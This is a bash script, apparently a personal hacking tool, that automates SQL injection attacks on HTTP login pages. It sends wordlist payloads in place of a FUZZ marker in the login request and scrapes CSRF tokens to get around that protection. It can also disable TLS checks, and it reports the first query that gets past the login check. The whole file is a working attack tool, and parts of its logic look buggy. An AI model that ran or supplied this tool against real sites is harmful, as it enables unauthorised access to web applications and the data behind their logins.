#!/bin/bash

# HTTP login page Brute Force with SQL Queries by Sajibu

# Parsing Arguments

while [ $# -gt 0 ]; do

  key="$1"

  case "${key}" in

    -u|--url)
      URL="$2"
      shift # past argument
      shift # past value
      ;;
    -w|--wordlist)
      WORDLIST=$2
      shift # past argument
      shift # past value
      ;;
    -r|--request)
      LOGIN=$2
      shift # past argument
      shift # past value
      ;;
    -H|--header)
      HEADER=$2
      shift # past argument
      shift # past value
      ;;
    -e|--error)
      ERROR=$2
      shift # past argument
      shift # past value
      ;;
    -c|--cookie)
      Cookie=$2
      shift # past argument
      shift # past value
      ;;
    -s|--ssl)
      SSL=$2
      shift # past argument
      shift # past value
      ;;
    -C|--csrf)
      CSRF=$2
      shift # past argument
      shift # past value
      ;;
    -v|--verbose)
      VERBOSE=$1
      shift # past argument
      shift # past value
      ;;          
    -h|--help)
    echo -e "USAGE:\n-u | --url = Supply the login page, for example: -u http://192.168.98.200/login.php\n-w | --wordlist = Wordlist path.\n-r | --request = Request body, for example: -r 'user=FUZZ&password=123' replace injectable string with FUZZ keyword!\n-e | --error = Failed login attempt message, example: -e 'Invalid user or password.'\n-C | --csrf = Bypass CSRF protection. Use example: -C 'true'\n-c | --cookie = Set Cookie, for example: 'wordpress_test_cookie=WP%20Cookie%20check'\n-H | --header = Any header, for example: 'X-Forwarded-For: 10.10.10.10'\n-s | --ssl = No SSL/TLS check. Example: --ssl true\n-v | --verbose = Print header and post response to the screen. Example: -v | --verbose"
      shift # past argument
      exit 1
      ;;
    -*|--*)
      echo -e "$1 Required one parameter"
      exit 1
      ;;

  esac

done

echo $@
# Arguments check

if [[ "$URL" == '' ]]; then

  echo -e "[-] URL is not specified, use -u or --url."
  echo -e "[-] Please use single quotes and type -h or --help for usage."
  exit
  
fi

if [[ "$LOGIN" == '' ]]; then

  echo -e "[-] Request body is not specified, use -r|--request."
  echo -e "[-] Please use single quotes and type -h or --help for usage."
  exit

fi

if [[ "$ERROR" == '' ]]; then

  echo -e "[-] Error message - Error response message isn't specified, use -e or --error."
  echo -e "[-] Please use single quotes and type -h or --help for usage."
  exit

fi

if [[ "$WORDLIST" == '' ]]; then

  echo -e "[-] Path for SQL injection dictionary queries isn't specified, use -w or --wordlist."
  echo -e "[-] Please use single quotes and type -h or --help for usage."
  exit
    
fi


if [[ "$SSL" != '' ]] && [[ "$SSL" != 'true' ]];then

  echo -e "-s / --ssl must be set to true!"
  
  exit

fi



main() {

  #Header is set with different arguements check

  if [ "$HEADER" != '' ] && [ "$Cookie" == '' ] && [ "$CSRF" == '' ] && [ "$SSL" != 'true' ]; then
    
    REQUEST=$(curl -D headers.txt $1 -s "${URL}" -H "${HEADER}"  --data-raw "${LOGIN/FUZZ/$wordlist}")
    
    response=$(echo -e $REQUEST > response.txt)


  elif [ "$HEADER" != '' ] && [ "$Cookie" != '' ] && [ "$CSRF" == '' ] && [ "$SSL" != 'true' ]; then
    
    REQUEST=$(curl -D headers.txt $1 -s "${URL}" --cookie "${Cookie}" -H "${HEADER}" --data-raw "${LOGIN/FUZZ/$wordlist}")
    
    response=$(echo -e $REQUEST > response.txt)

  elif [ "$HEADER" != '' ] && [ "$Cookie" != '' ] && [ "$CSRF" != '' ] && [ "$SSL" != 'true' ]; then
    
    CSRF_Name=$(curl -D headers.txt -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
    
    CSRF_REQ=$(curl -D headers.txt -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
    
    REQUEST=$(curl -D headers.txt $1 -s -b "cookies.txt" "${URL}" -H ${HEADER} --cookie ${Cookie} --cookie ${CSRF_REQ} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}")
    
    response=$(echo -e $REQUEST > response.txt)
    
  elif [ "$HEADER" != '' ] && [ "$Cookie" != '' ] && [ "$CSRF" != '' ] && [ "$SSL" == 'true' ]; then
    
    CSRF_Name=$(curl -D headers.txt -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
    
    CSRF_REQ=$(curl -D headers.txt -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
    
    REQUEST=$(curl -D headers.txt $1 -s -b -k "cookies.txt" "${URL}" --cookie ${Cookie} --cookie ${CSRF_REQ} -H ${HEADER} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}")
    
    response=$(echo -e $REQUEST > response.txt)
    
  elif [ "$HEADER" != '' ] && [ "$Cookie" == '' ] && [ "$CSRF" == '' ] && [ "$SSL" != 'true' ]; then
    
    REQUEST=$(curl -D headers.txt $1 -s -k "${URL}" -H "${HEADER}" --data-raw "${LOGIN/FUZZ/$wordlist}")
    
    response=$(echo -e $REQUEST > response.txt)
    
  elif [ "$HEADER" != '' ] && [ "$Cookie" == '' ] && [ "$CSRF" != '' ] && [ "$SSL" != 'true' ]; then
    
    CSRF_Name=$(curl -D headers.txt -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
    
    CSRF_REQ=$(curl -D headers.txt -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
    
    REQUEST=$(curl -D headers.txt $1 -s -b "cookies.txt" "${URL}" -H ${HEADER} --cookie ${CSRF_REQ} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}")
        
    response=$(echo -e $REQUEST > response.txt)
    
  # Cookie is set with other arguments

  elif [ "$HEADER" == '' ] && [ "$Cookie" != '' ] && [ "$CSRF" == '' ] && [ "$SSL" != 'true' ]; then
    
    REQUEST=$(curl -D headers.txt $1 -s "${URL}" --cookie "${Cookie}" -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' --data-raw "${LOGIN/FUZZ/$wordlist}")
    
    response=$(echo -e $REQUEST > response.txt)
    
  elif [ "$HEADER" == '' ] && [ "$Cookie" != '' ] && [ "$CSRF" != '' ] && [ "$SSL" != 'true' ]; then
    
    CSRF_Name=$(curl -D headers.txt -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
    
    CSRF_REQ=$(curl -D headers.txt -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
    
    REQUEST=$(curl -D headers.txt -s $1 -b "cookies.txt" "${URL}" --cookie ${Cookie} --cookie ${CSRF_REQ} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}")
    
    response=$(echo -e $REQUEST > response.txt)
    
  elif [ "$HEADER" == '' ] && [ "$Cookie" != '' ] && [ "$CSRF" != '' ] && [ "$SSL" == 'true' ]; then
    
    CSRF_Name=$(curl -D headers.txt -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
    
    CSRF_REQ=$(curl -D headers.txt -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
    
    REQUEST=$(curl -D headers.txt -s $1 -k -b "cookies.txt" "${URL}" --cookie ${Cookie} --cookie ${CSRF_REQ} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}")
        
    response=$(echo -e $REQUEST > response.txt)
    
  elif [ "$HEADER" == '' ] && [ "$Cookie" != '' ] && [ "$CSRF" == '' ] && [ "$SSL" == 'true' ]; then
    
    REQUEST=$(curl -D headers.txt -s -k -s "${URL}" --cookie "${Cookie}" -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' --data-raw "${LOGIN/FUZZ/$wordlist}")      
    
    response=$(echo -e $REQUEST > response.txt)
    

  # CSRF is true with other arguments

  elif [ "$HEADER" == '' ] && [ "$Cookie" == '' ] && [ "$CSRF" != '' ] && [ "$SSL" != 'true' ]; then
      
      CSRF_Name=$(curl -D headers.txt -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
      
      CSRF_REQ=$(curl -D headers.txt -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
      
      REQUEST=$(curl -D headers.txt -s $1 -b "cookies.txt" "${URL}" --cookie ${CSRF_REQ} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}" --header "X-CSRFToken: {$CSRF_REQ}")
            
      response=$(echo -e $REQUEST > response.txt)


  elif [ "$HEADER" == '' ] && [ "$Cookie" == '' ] && [ "$CSRF" != '' ] && [ "$SSL" == 'true' ]; then
    
    CSRF_Name=$(curl -D headers.txt -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
    
    CSRF_REQ=$(curl -D headers.txt -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
    
    REQUEST=$(curl -D headers.txt -s $1 -k -b "cookies.txt" "${URL}" --cookie ${CSRF_REQ} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}")
    
    response=$(echo -e $REQUEST > response.txt)
    
  # Only SSL is TRUE

  elif [ "$HEADER" == '' ] && [ "$Cookie" == '' ] && [ "$CSRF" == '' ] && [ "$SSL" != 'true' ]; then
    
    REQUEST=$(curl -D headers.txt -s -k "${URL}" -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' --data-raw "${LOGIN/FUZZ/$wordlist}")

  else

    REQUEST=$(curl -D headers.txt -s $1 "${URL}" -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' --data-raw "${LOGIN/FUZZ/$wordlist}")
    
    response=$(echo -e $REQUEST > response.txt)
    
  fi


}

# Variables

PASS="test"
wordlist=${WORDLIST}

# Counter
i=0

# Main loop 

while IFS= read -r wordlist;do
    
    # Increase counter
    ((i++))

    # Feedback for user
    echo -e "[-] Try ${i}: ${wordlist}"

    # Connect to server

    if [[ $VERBOSE == '-v' ]]; then
      
      main "-v"

    else
      main ""

    fi

  # Response check
  status_code=`cat "headers.txt"`
  match_response=$(echo -e $REQUEST)

  if [[ $VERBOSE == '-v' ]] && [[ "$match_response" != *"$ERROR"* ]] then # && [[ "$status_code" != *"/login?error=WrongCredentials"* ]];then
    # Success!
    echo -e "[*] Injection worked!"
    echo -e "[*] SQL Query in Username field is: ${wordlist}"
    printf "[*] If you're seen this message after the first try, please double check the failed login attempt message \n    or if CSRF protection is on to avoid false postive!\n"
    exit

  elif [[ "$match_response" != *"$ERROR"* ]] && [[ $VERBOSE == '' ]] && [[ "$status_code" != *"200"* ]]; then

    # Success!
    echo -e "[*] Injection worked!"
    echo -e "[*] SQL Query in Username field is: ${wordlist}"
    printf "[*] If you're seen this message after the first try, please double check the failed login attempt message \n    or if CSRF protection is on to avoid false postive!\n"
    exit

  fi

done < ${wordlist}
